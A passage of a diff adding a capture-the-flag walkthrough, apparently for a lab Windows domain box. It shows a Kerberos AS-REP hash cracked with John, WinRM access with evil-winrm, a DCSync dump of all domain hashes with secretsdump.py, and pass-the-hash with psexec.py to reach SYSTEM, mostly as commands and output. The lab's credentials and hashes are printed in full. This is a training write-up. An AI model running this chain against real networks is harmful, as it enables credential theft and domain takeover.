+# echo "$krb5asrep$23$svc_bes@MEGACORP.LOCAL:5fed9e70404f9f3e533da75fc5c8a6e0$feea6f77a795ab07264edf21ebafd039c5699560ef4116548f52ffc426481cb9c7da3bc26577cdf80732e9ddac1e3125d6f51b9c79d4d9f6943a4c9114eff8eeb8571ee07c9a8ae69c0c5235ebc5b0b8a6591eb02257ad04af50bbe0e9ced2311e9c7413bbf70faf43b2d0c64114e5bfbbef8f475df64f9a7d21c981aac73398f330e97f1439829d5f5f28cdd0a3b0d62764e1f46bfd9a1034c72ec5a635dbac32254263a51ac7eb4f3e8b202f25180f5d28a78110030cdba67e6d2c24db91c5946e983082b3f60c7f156d056a83fcb92a4f5eff7ef8bb7ee6fd2f5d71c05847e76022b10640dc5d2cfa06b23f5f93cc" > hash
+
+# john hash -wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Sheffield19      ($krb5asrep$23$svc_bes@MEGACORP.LOCAL)
+1g 0:00:00:23 DONE (2021-03-14 23:45) 0.04277g/s 453507p/s 453507c/s 453507C/s Sherbear94..Sheepy04
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+It is now possible to access the server as `svc_bes` using WinRM, and gain user.txt.
+
+```
+# gem install evil-winrm
+
+# evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc_bes\Documents> whoami
+megacorp\svc_bes
+```
+
+### Privilege Escalation
+
+In order to leverage the `GetChangesAll` permission, we can use Impacket's [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to perform a DCSync attack and dump the NTLM hashes of all domain users.
+
+```
+┌──(root💀kali)-[/home/kali/Documents/tools/impacket/examples]
+└─# python3 secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f9f700dbf7b492969aac5943dab22ff3:::
+svc_bes:1104:aad3b435b51404eeaad3b435b51404ee:0d1ce37b8c9e5cf4dbd20f5b88d5baca:::
+sandra:1105:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
+PATHFINDER$:1000:aad3b435b51404eeaad3b435b51404ee:a7c5b1140bf9e5fe8cd2f8eff51331b8:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:056bbaf3be0f9a291fe9d18d1e3fa9e6e4aff65ef2785c3fdc4f6472534d614f
+Administrator:aes128-cts-hmac-sha1-96:5235da455da08703cc108293d2b3fa1b
+Administrator:des-cbc-md5:f1c89e75a42cd0fb
+krbtgt:aes256-cts-hmac-sha1-96:d6560366b08e11fa4a342ccd3fea07e69d852f927537430945d9a0ef78f7dd5d
+krbtgt:aes128-cts-hmac-sha1-96:02abd84373491e3d4655e7210beb65ce
+krbtgt:des-cbc-md5:d0f8d0c86ee9d997
+svc_bes:aes256-cts-hmac-sha1-96:2712a119403ab640d89f5d0ee6ecafb449c21bc290ad7d46a0756d1009849238
+svc_bes:aes128-cts-hmac-sha1-96:7d671ab13aa8f3dbd9f4d8e652928ca0
+svc_bes:des-cbc-md5:1cc16e37ef8940b5
+sandra:aes256-cts-hmac-sha1-96:2ddacc98eedadf24c2839fa3bac97432072cfac0fc432cfba9980408c929d810
+sandra:aes128-cts-hmac-sha1-96:c399018a1369958d0f5b242e5eb72e44
+sandra:des-cbc-md5:23988f7a9d679d37
+PATHFINDER$:aes256-cts-hmac-sha1-96:0d0ebf46ef310c3420ef62aa0f45ca0a0f58df3ec851c251e10b86de3d64e22a
+PATHFINDER$:aes128-cts-hmac-sha1-96:f98eb6ab885be55f0e5aa2cc267c4ca1
+PATHFINDER$:des-cbc-md5:a23bad805b2525ea
+[*] Cleaning up... 
+```
+
+Using the default domain administrator NTLM hash, we can use this in a PTH attack to gain elevated access to the system. For this, we can use  Impacket's psexec.py.
+
+```
+┌──(root💀kali)-[/home/kali/Documents/tools/impacket/examples]
+└─# python3 psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.30.....
+[*] Found writable share ADMIN$
+[*] Uploading file YThJDZyj.exe
+[*] Opening SVCManager on 10.10.10.30.....
+[*] Creating service QedB on 10.10.10.30.....
+[*] Starting service QedB.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
 ```
 
